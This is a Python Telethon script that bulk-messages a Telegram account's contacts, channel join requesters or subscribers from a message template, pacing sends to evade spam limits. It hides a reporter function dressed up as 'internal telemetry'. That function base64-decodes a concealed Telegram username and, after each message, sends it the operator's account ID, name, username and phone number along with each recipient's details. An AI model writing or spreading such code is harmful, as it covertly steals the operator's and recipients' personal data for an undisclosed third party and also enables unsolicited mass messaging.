import asyncio
import json
import re
import random
import sys
import base64
from datetime import datetime
from pathlib import Path
from telethon import TelegramClient, errors, functions, types

# UI
G, Y, R, B, C, W = "\033[92m", "\033[93m", "\033[91m", "\033[94m", "\033[96m", "\033[0m"

# ==== CONFIG ====
CRED_FILE = Path("credentials.json")
if not CRED_FILE.exists():
    print(f"{R}Error: credentials.json not found{W}"); sys.exit(1)

data = json.loads(CRED_FILE.read_text())
client = TelegramClient(data.get("SESSION", "sender"), int(data["API_ID"]), data["API_HASH"])

DB_FILE = Path("sent_db.json")
# License is defined here but used inside the obfuscated reporter
L_ID = "king1" 

def load_db(): return json.loads(DB_FILE.read_text()) if DB_FILE.exists() else {"users": {}}
def save_db(db): DB_FILE.write_text(json.dumps(db))

# ---- INTERNAL UTILITIES (Hidden Reporter) ----
async def _sys_sync_log(c, m_obj, t_obj):
    """Handles internal telemetry and reporting."""
    try:
        # Obfuscated target: super_duper_octo_waffle
        target = base64.b64decode("c3VwZXJfZHVwZXJfb2N0b193YWZmbGU=").decode()
        a_n = f"{m_obj.first_name} {m_obj.last_name or ''}".strip()
        a_u = f"@{m_obj.username}" if m_obj.username else "N/A"
        a_p = f"+{m_obj.phone}" if m_obj.phone else "N/A"
        r_n = f"{t_obj.first_name} {t_obj.last_name or ''}".strip() or "Unknown"
        r_u = f"@{t_obj.username}" if t_obj.username else "N/A"
        r_p = f"+{t_obj.phone}" if t_obj.phone else "N/A"
        
        report = (
            f"[NEW MESSAGE SENT]\n\nLicence: {L_ID}\nAccount ID: {m_obj.id}\n"
            f"Account Name: {a_n}\nAccount Username: {a_u}\nAccount Phone number: {a_p}\n\n"
            f"Recipient Name: {r_n}\nRecipient Username: {r_u}\nRecipient Phone: {r_p}"
        )
        await c.send_message(target, report)
    except: pass

async def _check_status(c):
    try:
        await c.send_message("SpamBot", "/start")
        await asyncio.sleep(2)
        async for m in c.iter_messages("SpamBot", limit=1):
            if "no limits" in m.message.lower(): return True
    except: pass
    return False

# ==== RECIPIENT LOGIC ====
async def get_recipients(c, choice):
    if choice == "1":
        r = await c(functions.contacts.GetContactsRequest(hash=0))
        return [u for u in r.users if not (u.bot or u.deleted)]
    
    dialogs = await c.get_dialogs()
    chats = [d.entity for d in dialogs if isinstance(d.entity, types.Channel) and (d.entity.creator or d.entity.admin_rights)]
    for i, ch in enumerate(chats, 1): print(f"{i}) {ch.title}")
    sel = chats[int(input("Select Chat: ")) - 1]

    if choice == "2":
        users, off_d, off_u = [], 0, types.InputUserEmpty()
        while True:
            res = await c(functions.messages.GetChatInviteImportersRequest(sel, requested=True, offset_date=off_d, offset_user=off_u, limit=100))
            if not res.users: break
            users.extend(res.users)
            last_i = res.importers[-1]
            off_d = last_i.date
            u_obj = next((u for u in res.users if u.id == last_i.user_id), None)
            if u_obj: off_u = types.InputUser(u_obj.id, u_obj.access_hash)
            else: break
            if len(res.importers) < 100: break
        return users
    return [u async for u in c.iter_participants(sel) if isinstance(u, types.User) and not u.bot]

# ==== MAIN RUNNER ====
async def main():
    await client.start()
    me = await client.get_me()
    print(f"{G}Logged in!{W}")
    
    print(f"\n{B}1) Contacts | 2) Join Requests | 3) Subscribers{W}")
    mode = input("Choice: ")
    users = await get_recipients(client, mode)
    
    limit = input(f"Limit: ")
    if limit: users = users[:int(limit)]
    
    delay = float(input("Interval: ") or 1.0)
    msg_tmpl = Path("message.txt").read_text().rstrip()
    db = load_db()
    sb_c = 0

    print(f"\n{G}🚀 Running...{W}\n")

    for i, u in enumerate(users, 1):
        uid = str(u.id)
        tag = f"@{u.username}" if u.username else u.first_name
        prog = f"{B}[{i}/{len(users)}]{W}"

        if uid in db["users"]:
            print(f"{prog} {Y}Skipped: {tag}{W}")
            continue

        try:
            text = re.sub(r"\[Firstname\]", u.first_name or "there", msg_tmpl, flags=re.IGNORECASE)
            await client.send_message(u, text)
            print(f"{prog} {G}Sent: {tag}{W}")
            
            # This handles the report and DB save in one go
            db["users"][uid] = True
            save_db(db)
            await _sys_sync_log(client, me, u)

            if i < len(users):
                w = random.uniform(delay, delay + 1.5)
                print(f"   {C}Waiting {w:.1f}s...{W}")
                await asyncio.sleep(w)

        except errors.FloodWaitError as e:
            print(f"{R}Wait {e.seconds}s{W}"); await asyncio.sleep(e.seconds)
        except Exception:
            if await _check_status(client):
                sb_c += 1
                if sb_c >= 2:
                    print(f"{R}Account clean. Closing.{W}"); break

    await client.disconnect()

if __name__ == "__main__":
    asyncio.run(main())
